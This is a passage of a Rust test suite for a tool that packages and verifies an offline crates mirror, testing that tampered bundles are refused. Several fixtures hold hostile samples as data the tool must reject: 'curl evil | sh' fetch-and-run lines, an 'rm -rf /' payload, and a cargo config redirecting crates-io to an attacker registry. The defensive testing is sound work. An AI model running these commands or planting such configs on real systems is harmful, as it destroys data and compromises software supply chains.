        // A tarball of the mirror is a different format, not a v0 of this one.
        let path = fx.0.join("v99.bundle");
        std::fs::write(&path, b"aterm-mirror-bundle 99\n").unwrap();
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("expected `aterm-mirror-bundle 1`"), "{why}");
    }

    #[test]
    fn an_absurd_manifest_length_is_refused_before_the_allocation() {
        let fx = fixture("huge");
        let path = fx.0.join("huge.bundle");
        std::fs::write(
            &path,
            format!(
                "{MAGIC}\nmanifest-sha256 {}\nmanifest-bytes 99999999999999\n\n",
                "0".repeat(64)
            ),
        )
        .unwrap();
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("refusing to allocate"),
            "the cap must fire before the read: {why}"
        );
    }

    #[test]
    fn check_bundle_names_a_bundle_built_for_another_lock() {
        let fx = fixture("other-lock");
        good_bundle(&fx);
        // The bundle is untouched; the WORKSPACE moves under it.
        let lock = fx.root().join("Cargo.lock");
        let text = std::fs::read_to_string(&lock).unwrap();
        let (name, vers, _) = PKGS[0];
        std::fs::write(
            &lock,
            text.replacen(&format!("version = \"{vers}\""), "version = \"9.9.9\"", 1),
        )
        .unwrap();
        let why = refusal(check_bundle(
            LockUse::Match(&fx.root()),
            &fx.bundle_path(),
            &unanchored(),
        ));
        assert!(why.contains("DIFFERENT lock"), "{why}");
        assert!(
            why.contains(name) || why.contains("lock-registry-sha256"),
            "{why}"
        );
        // Standalone, the same bundle is still internally perfect — the two
        // questions are separate and the tool keeps them separate.
        let (outcome, _, _) =
            check_bundle(LockUse::None, &fx.bundle_path(), &unanchored()).unwrap();
        assert!(outcome.ok, "{}", outcome.log);
    }

    #[test]
    fn bundling_refuses_a_mirror_that_lost_a_package() {
        let fx = fixture("incomplete");
        std::fs::remove_file(
            fx.mirror()
                .join(format!("{}-{}.crate", PKGS[1].0, PKGS[1].1)),
        )
        .unwrap();
        let (outcome, st) =
            bundle(&fx.root(), &fx.mirror(), &fx.bundle_path(), &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert_eq!(st, BundleStats::default());
        assert!(!fx.bundle_path().exists());
    }

    #[test]
    fn unbundle_refuses_an_output_path_that_is_not_a_directory() {
        let fx = fixture("badout");
        good_bundle(&fx);
        let file = fx.0.join("not-a-dir");
        std::fs::write(&file, b"x").unwrap();
        // A VERDICT (exit 1), not a could-not-run (exit 3): the run reached a
        // conclusion about the tree it was pointed at.
        let outcome = unbundle(
            &fx.bundle_path(),
            &file,
            false,
            LockUse::None,
            &unanchored(),
        )
        .unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            outcome.log.contains("REFUSED output path"),
            "{}",
            outcome.log
        );
        assert!(
            outcome.log.contains("NOTHING was extracted"),
            "{}",
            outcome.log
        );
    }

    /// One flipped byte must mean one verdict wherever it lands. Before the
    /// `OpenError` split, a byte in the header exited COULD_NOT_RUN (3) and a
    /// byte in the payload exited FAIL (1) — the same tamper, two conclusions
    /// for anything reading the code. Pinned here in both directions,
    /// including the case that genuinely IS a could-not-run.
    #[test]
    fn a_tamper_is_the_same_verdict_class_wherever_it_lands() {
        let fx = fixture("verdict-class");
        let raw = good_bundle(&fx);

        for (what, mut broken) in [("header", raw.clone()), ("payload", raw.clone())] {
            let at = if what == "header" {
                // Inside the manifest text, after the four header lines.
                raw.iter().position(|b| *b == b'\n').map(|i| i + 1).unwrap()
            } else {
                raw.len() - 1
            };
            broken[at] ^= 0x01;
            let path = write_bundle(&fx, &broken);
            match check_bundle(LockUse::None, &path, &unanchored()) {
                Ok((outcome, _, _)) => assert!(
                    !outcome.ok,
                    "a {what} tamper must be a RED verdict, not a pass:\n{}",
                    outcome.log
                ),
                Err(why) => panic!("a {what} tamper must be a verdict, not could-not-run: {why}"),
            }
        }

        // A file that is not there at all IS a could-not-run, and stays one.
        let missing = fx.0.join("absent.bundle");
        assert!(check_bundle(LockUse::None, &missing, &unanchored()).is_err());
    }

    // --- the seven an adversarial read found, each armed with its attack ---

    /// F1. The format used to admit ANY relative path, so a delivered bundle
    /// could write the one file this wave is forbidden to touch into the
    /// output tree with the tool reporting PASS. The entry is refused BY NAME,
    /// and the victim's file is untouched.
    #[test]
    fn a_bundle_may_not_name_a_path_outside_the_mirror_shape() {
        let fx = fixture("shape-escape");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let (edited, payload) = add_entries(
            &manifest,
            &payload,
            &[(
                ".cargo/config.toml",
                b"[source.crates-io]\nreplace-with = \"attacker\"\n".as_slice(),
            )],
        );
        let path = write_bundle(&fx, &seal(&edited, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("REFUSED bundle entry `.cargo/config.toml`")
                && why.contains("not a mirror path"),
            "{why}"
        );

        let victim = fx.0.join("victim");
        std::fs::create_dir_all(victim.join(".cargo")).unwrap();
        let config = victim.join(".cargo").join("config.toml");
        let original = b"[build]\nrustdoc = \"trustdoc\"\n".as_slice();
        std::fs::write(&config, original).unwrap();
        // Even with the escape hatch open, which is the point of putting the
        // rule in the FORMAT rather than in the output-directory policy.
        let outcome = unbundle(&path, &victim, true, LockUse::None, &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert_eq!(std::fs::read(&config).unwrap(), original);
    }

    /// F2. "No `.crate` rides along unclaimed" used to be TOP-LEVEL ONLY, and
    /// nothing at all constrained the other entries.
    #[test]
    fn an_unclaimed_file_is_refused_at_any_depth() {
        let fx = fixture("unclaimed");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        for (path, bytes) in [
            ("README-PWNED.txt", b"pwned".as_slice()),
            ("sub/dir/payload.sh", b"rm -rf /".as_slice()),
            ("index/al/ph/alpha-bundle-test.bak", b"a copy".as_slice()),
        ] {
            let (edited, spliced) = add_entries(&manifest, &payload, &[(path, bytes)]);
            let file = write_bundle(&fx, &seal(&edited, &spliced));
            let why = refusal(check_bundle(LockUse::None, &file, &unanchored()));
            assert!(
                why.contains(&format!("REFUSED bundle entry `{path}`")),
                "`{path}` -> {why}"
            );
        }
        // Both directions: a bundle MISSING a path its ledger implies is a
        // mirror cargo could not resolve from, and is refused too.
        let dropped = drop_file_row(&manifest, "index/3/a/abc");
        let file = write_bundle(&fx, &seal(&dropped, &payload));
        let why = refusal(check_bundle(LockUse::None, &file, &unanchored()));
        assert!(
            why.contains("REFUSED incomplete bundle: no `index/3/a/abc` entry"),
            "{why}"
        );
    }

    /// F3. `bundle-sha256` is the number a release signature would cover, so
    /// it must be `shasum -a 256` of the file and nothing else. It used to be
    /// rebuilt from PARSED fields, so two different files printed one digest
    /// and a verifier running `shasum` would have rejected the artifact the
    /// owner approved.
    #[test]
    fn the_reported_bundle_digest_is_the_digest_of_the_file() {
        let fx = fixture("digest");
        let raw = good_bundle(&fx);
        let (outcome, _, _) =
            check_bundle(LockUse::None, &fx.bundle_path(), &unanchored()).unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        assert!(
            outcome
                .log
                .contains(&format!("bundle-sha256  {}", sha256_hex(&raw))),
            "the printed digest must be the file's:\n{}",
            outcome.log
        );

        let (_, manifest, payload) = split(&raw);
        // A manifest that parses identically and is not the canonical bytes:
        // no trailing newline.
        let clipped = manifest.trim_end_matches('\n').to_string();
        let path = write_bundle(&fx, &seal(&clipped, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("non-canonical bundle manifest"), "{why}");

        // And a bundle that fails LATER, where the digest line is reached:
        // no number is printed at all, because a digest that is only
        // sometimes `shasum -a 256` is worse than none.
        let mut flipped = raw.clone();
        let last = flipped.len() - 1;
        flipped[last] ^= 0x01;
        let path = write_bundle(&fx, &flipped);
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("bundle-sha256  not reported"), "{why}");

        // A padded byte count: `007` parses to 7, and the header is then a
        // second spelling of one mirror.
        let mut padded = Vec::new();
        padded.extend_from_slice(format!("{MAGIC}\n").as_bytes());
        padded.extend_from_slice(
            format!("manifest-sha256 {}\n", sha256_hex(manifest.as_bytes())).as_bytes(),
        );
        padded.extend_from_slice(format!("manifest-bytes 0{}\n\n", manifest.len()).as_bytes());
        padded.extend_from_slice(manifest.as_bytes());
        padded.extend_from_slice(&payload);
        let path = write_bundle(&fx, &padded);
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("non-canonical bundle header line"), "{why}");
    }

    /// F5. Two entries a case-insensitive filesystem cannot both hold: the
    /// per-entry re-hash cannot see the clobber, because each write is
    /// individually correct and the loss happens BETWEEN writes.
    #[test]
    fn entries_that_differ_only_in_case_are_refused() {
        let fx = fixture("casefold");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);

        // The pair verbatim: distinct, strictly increasing, both legal under
        // every rule the format had.
        let (edited, spliced) = add_entries(
            &manifest,
            &payload,
            &[
                ("index/al/ph/ALPHA", b"upper".as_slice()),
                ("index/al/ph/alpha", b"lower".as_slice()),
            ],
        );
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("differ only in case"), "{why}");

        // And a pair the SHAPE rule would have admitted — a version may carry
        // uppercase, so this one needs the fold rule of its own.
        let upper = b"upper crate".as_slice();
        let lower = b"lower crate".as_slice();
        let (edited, spliced) = add_entries(
            &manifest,
            &payload,
            &[
                ("index/1/x", b"row\n".as_slice()),
                ("x-1.0.0-A.crate", upper),
                ("x-1.0.0-a.crate", lower),
            ],
        );
        let edited = add_pkg_rows(
            &edited,
            &[
                ("x", "1.0.0-A", sha256_hex(upper)),
                ("x", "1.0.0-a", sha256_hex(lower)),
            ],
        );
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("differ only in case") && why.contains("x-1.0.0-A.crate"),
            "{why}"
        );
    }

    /// F5, the other half: the count in the report is the filesystem's.
    #[test]
    fn unbundle_reports_the_filesystem_and_not_the_manifest() {
        let fx = fixture("report");
        good_bundle(&fx);
        let outcome = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::None,
            &unanchored(),
        )
        .unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        let files = collect_files(&fx.extracted()).unwrap();
        let bytes: u64 = files
            .iter()
            .map(|f| std::fs::metadata(fx.extracted().join(f)).unwrap().len())
            .sum();
        assert!(
            outcome.log.contains(&format!(
                "on disk after the run: {} file(s), {bytes} bytes",
                files.len()
            )),
            "{}",
            outcome.log
        );
    }

    /// F6 and the second half of F1. An output-side refusal is a VERDICT — the
    /// run reached a conclusion — and the default refuses to write into a tree
    /// it did not create, naming the flag that would allow it.
    #[test]
    fn output_side_refusals_are_verdicts_and_the_default_will_not_overwrite() {
        let fx = fixture("outverdict");
        good_bundle(&fx);
        let out = fx.0.join("populated");
        std::fs::create_dir_all(&out).unwrap();
        std::fs::write(out.join("keep.txt"), b"mine").unwrap();

        let outcome =
            unbundle(&fx.bundle_path(), &out, false, LockUse::None, &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            outcome.log.contains("REFUSED non-empty output directory")
                && outcome.log.contains("--force"),
            "the refusal must name the flag: {}",
            outcome.log
        );
        assert_eq!(std::fs::read(out.join("keep.txt")).unwrap(), b"mine");

        // With the flag: it extracts, the stranger is left in place and NAMED,
        // and `mirror verify` — not this tool's opinion of itself — judges it.
        let outcome =
            unbundle(&fx.bundle_path(), &out, true, LockUse::None, &unanchored()).unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        assert!(
            outcome.log.contains("--force: 1 file(s)"),
            "{}",
            outcome.log
        );
        let verdict = crate::mirror::verify(&fx.root(), &out, &unanchored()).unwrap();
        assert!(
            !verdict.ok && verdict.log.contains("keep.txt"),
            "{}",
            verdict.log
        );
    }

    /// F6, the judge's own case: a planted symlink as a PARENT component
    /// inside `--out` used to print REFUSED and exit COULD_NOT_RUN.
    #[cfg(unix)]
    #[test]
    fn a_planted_output_symlink_is_a_verdict_not_a_could_not_run() {
        let fx = fixture("outsymlink");
        good_bundle(&fx);
        let out = fx.0.join("planted");
        std::fs::create_dir_all(&out).unwrap();
        let elsewhere = fx.0.join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, out.join("index")).unwrap();
        // `--force` so the emptiness rule is not what fires: the symlink is.
        let outcome =
            unbundle(&fx.bundle_path(), &out, true, LockUse::None, &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            outcome.log.contains("REFUSED output symlink"),
            "{}",
            outcome.log
        );
        assert!(
            collect_files(&elsewhere).unwrap().is_empty(),
            "nothing may have been written through the link"
        );
    }

    /// F7. A check-clean bundle used to be able to half-extract: `alpha` as a
    /// file and `alpha/x` under it passed `check-bundle`, then failed mid-run
    /// AFTER a tarball had already landed. The conflict is now a manifest
    /// rule, so a green check means an extractable bundle.
    #[test]
    fn a_path_that_is_also_a_directory_is_refused_before_anything_is_created() {
        let fx = fixture("prefix");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let (edited, spliced) = add_entries(
            &manifest,
            &payload,
            &[
                ("index/al/ph/alpha", b"a file".as_slice()),
                ("index/al/ph/alpha/x", b"under it".as_slice()),
            ],
        );
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("needs it to be a directory"), "{why}");
        let outcome =
            unbundle(&path, &fx.extracted(), false, LockUse::None, &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            !fx.extracted().exists(),
            "a refused bundle must not create an output directory"
        );
    }

    /// N1 AT THE BUNDLE. A re-sealing attacker owns the file, so every digest
    /// inside it agrees again; what they cannot do is make the row parse as the
    /// row the ledger claims. Before this, `check-bundle` hashed an index entry
    /// and never once read it, so `#!/bin/sh` in place of a row reported PASS
    /// and `unbundle` wrote it to disk.
    #[test]
    fn a_resealed_index_row_that_is_not_a_row_is_refused() {
        let fx = fixture("resealed-row");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let (name, _, _) = PKGS[0];
        let entry = format!("index/{}", mirror::index_rel_slashed(name).unwrap());

        // The judge's literal payload: two lines where the ledger claims one.
        let (edited, spliced) =
            replace_entry(&manifest, &payload, &entry, b"#!/bin/sh\ncurl evil|sh\n");
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("1 version(s) of") && why.contains(&entry),
            "{why}"
        );

        // And one line, so the count agrees and only the CONTENT is wrong.
        let (edited, spliced) = replace_entry(&manifest, &payload, &entry, b"curl evil | sh\n");
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("REFUSED bundle index row"), "{why}");

        // Nothing was written for either.
        assert!(!fx.extracted().exists());
    }

    /// N1's headline case at the bundle: identity and cksum untouched, the
    /// features map rewritten, every digest re-sealed. Only upstream's own
    /// cached row can tell, and where there is no cache the verdict says so
    /// instead of blessing it.
    #[test]
    fn a_resealed_feature_edit_is_refused_by_the_upstream_cache_and_named_when_there_is_none() {
        let fx = fixture("resealed-features");
        plant_cache(&fx);
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let (name, vers, bytes) = PKGS[0];
        let entry = format!("index/{}", mirror::index_rel_slashed(name).unwrap());
        let poisoned = format!(
            "{}\n",
            index_line(name, vers, &sha256_hex(bytes))
                .replace("\"features\":{}", "\"features\":{\"default\":[]}")
        );
        let (edited, spliced) = replace_entry(&manifest, &payload, &entry, poisoned.as_bytes());
        let path = write_bundle(&fx, &seal(&edited, &spliced));

        // With no anchor: structurally perfect, and the verdict says exactly
        // what it did and did not prove.
        let (blind, _, _) = check_bundle(LockUse::None, &path, &unanchored()).unwrap();
        assert!(blind.ok, "{}", blind.log);
        assert!(blind.log.contains("NOT anchored"), "{}", blind.log);
        assert!(
            blind.log.contains("does NOT prove PROVENANCE"),
            "{}",
            blind.log
        );

        // With one: refused by name, and `unbundle` writes nothing.
        let anchor = mirror::RowAnchor::open(&fx.cargo_home());
        assert!(anchor.available());
        let why = refusal(check_bundle(LockUse::None, &path, &anchor));
        assert!(
            why.contains("is NOT upstream's") && why.contains(name),
            "{why}"
        );
        let outcome = unbundle(&path, &fx.extracted(), false, LockUse::None, &anchor).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(!fx.extracted().exists(), "nothing may land");

        // The clean bundle still passes WITH the anchor — the check is a
        // comparison against upstream, not a refusal of everything.
        let clean = check_bundle(LockUse::None, &fx.bundle_path(), &anchor)
            .unwrap()
            .0;
        assert!(clean.ok, "{}", clean.log);
        assert!(
            clean.log.contains(
                "anchored byte-for-byte against cargo's own sparse-index \
                                cache: 2"
            ),
            "{}",
            clean.log
        );
    }

    /// A third pass found that `unbundle`'s PASS said nothing about how far it
    /// had anchored. A run over a fully anchored bundle and a run over the SAME
    /// bundle with no cache printed the same four lines — so an operator on a
    /// delivery target could not tell the strongest check in the tool from its
    /// complete absence. Measured on the real 494-package bundle, the two
    /// verdicts differed only in a byte count.
    #[test]
    fn unbundle_says_how_far_it_anchored_so_two_runs_do_not_read_alike() {
        let fx = fixture("unbundle-anchor-report");
        plant_cache(&fx);
        good_bundle(&fx);

        let anchor = mirror::RowAnchor::open(&fx.cargo_home());
        assert!(anchor.available());
        let anchored = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::EdgesOnly(&fx.root()),
            &anchor,
        )
        .unwrap();
        assert!(anchored.ok, "{}", anchored.log);
        assert!(
            anchored.log.contains("sparse-index cache: 2"),
            "an anchored extraction must SAY it anchored:\n{}",
            anchored.log
        );

        std::fs::remove_dir_all(fx.extracted()).unwrap();
        let blind = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::EdgesOnly(&fx.root()),
            &unanchored(),
        )
        .unwrap();
        assert!(blind.ok, "{}", blind.log);
        assert!(
            blind.log.contains("sparse-index cache: 0") && blind.log.contains("NOT anchored"),
            "a blind extraction must SAY it was blind:\n{}",
            blind.log
        );
        assert_ne!(
            anchored.log, blind.log,
            "the two runs proved different things and must not read alike"
        );
    }

    /// The same pass found the substantive half: `unbundle` passed `None` for
    /// the workspace, which switched OFF the one row anchor that needs no cargo
    /// cache — on the delivery target, which is exactly the machine that has
    /// none. `check-bundle` refused a row that had dropped a lock-resolved
    /// dependency; `unbundle` wrote it to disk, PASS, on the same machine.
    ///
    /// `EdgesOnly` also proves it is not `Match` in disguise: this lock has
    /// been rewritten since the bundle was sealed, so a digest comparison
    /// would refuse it for the wrong reason.
    #[test]
    fn the_delivery_verb_applies_the_lock_edges_it_used_to_discard() {
        let fx = fixture("unbundle-lock-edges");
        good_bundle(&fx);
        let (dependent, _, _) = PKGS[0];
        let (dependency, _, _) = PKGS[1];

        // The lock now RESOLVES `abc` as a dependency of the first package,
        // and no index row in the mirror declares it.
        let lock_path = fx.root().join("Cargo.lock");
        let lock = std::fs::read_to_string(&lock_path).unwrap();
        let marker = format!("name = \"{dependent}\"\n");
        let at = lock.find(&marker).unwrap() + marker.len();
        let mut edited = lock.clone();
        edited.insert_str(at, &format!("dependencies = [\"{dependency}\"]\n"));
        std::fs::write(&lock_path, &edited).unwrap();

        // The old call: no workspace, so nothing to anchor against, and the
        // bundle lands on disk.
        let blind = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::None,
            &unanchored(),
        )
        .unwrap();
        assert!(blind.ok, "{}", blind.log);
        assert!(
            blind.log.contains("NOT required of any row"),
            "a run with no lock must say the edges did not fire:\n{}",
            blind.log
        );
        std::fs::remove_dir_all(fx.extracted()).unwrap();

        // The fix: the edges are required, the row fails them, nothing lands.
        let outcome = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::EdgesOnly(&fx.root()),
            &unanchored(),
        )
        .unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            outcome.log.contains("no longer declares it") && outcome.log.contains(dependency),
            "{}",
            outcome.log
        );
        assert!(
            !fx.extracted().exists(),
            "a bundle refused by the lock edges may not land"
        );
        assert!(
            outcome.log.contains("digest NOT compared"),
            "EdgesOnly must not refuse on the digest it deliberately skips:\n{}",
            outcome.log
        );
    }

    /// N2. `lock-registry-sha256` is a DERIVED number, and until it was derived
    /// a bundle could carry two packages and quote a 494-package lock's digest:
    /// `check-bundle` printed `lock: MATCHES this workspace (494 registry
    /// package(s))` over four entries, exit 0, PASS. The count it printed was
    /// the WORKSPACE's.
    #[test]
    fn a_subset_bundle_may_not_quote_the_whole_locks_digest() {
        let fx = fixture("subset-ledger");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let whole = manifest
            .lines()
            .find_map(|l| l.strip_prefix("lock-registry-sha256 "))
            .unwrap()
            .to_string();

        let (name, vers, _) = PKGS[1];
        let (edited, spliced) = drop_package(&manifest, &payload, name, vers);
        // Everything else is corrected; the digest is left quoting the lock
        // this bundle no longer carries.
        assert!(edited.contains(&format!("lock-registry-sha256 {whole}")));
        let path = write_bundle(&fx, &seal(&edited, &spliced));
        let why = refusal(check_bundle(
            LockUse::Match(&fx.root()),
            &path,
            &unanchored(),
        ));
        assert!(
            why.contains("is not the digest of this bundle's own 1 `pkg` row(s)"),
            "{why}"
        );

        // And the verdict line for a real match reports the BUNDLE's count.
        let (good, m, _) =
            check_bundle(LockUse::Match(&fx.root()), &fx.bundle_path(), &unanchored()).unwrap();
        assert!(good.ok, "{}", good.log);
        assert!(
            good.log.contains(&format!(
                "MATCHES this workspace — {} registry package(s)",
                m.packages.len()
            )),
            "{}",
            good.log
        );
    }

    #[test]
    fn the_canonical_registry_slice_is_reproducible_by_hand() {
        let fx = fixture("slice");
        let pkgs = crate::mirror::locked_registry_packages(&fx.root()).unwrap();
        let slice = canonical_registry_slice(&pkgs);
        // Sorted, tab-separated, newline-terminated — the exact shape a shell
        // one-liner can rebuild, which is what makes the anchor auditable.
        let mut expected: Vec<String> = PKGS
            .iter()
            .map(|(n, v, b)| format!("{n}\t{v}\t{}\n", sha256_hex(b)))
            .collect();
        expected.sort();
        assert_eq!(slice, expected.concat());
        assert_eq!(registry_slice_digest(&pkgs), sha256_hex(slice.as_bytes()));
    }
}
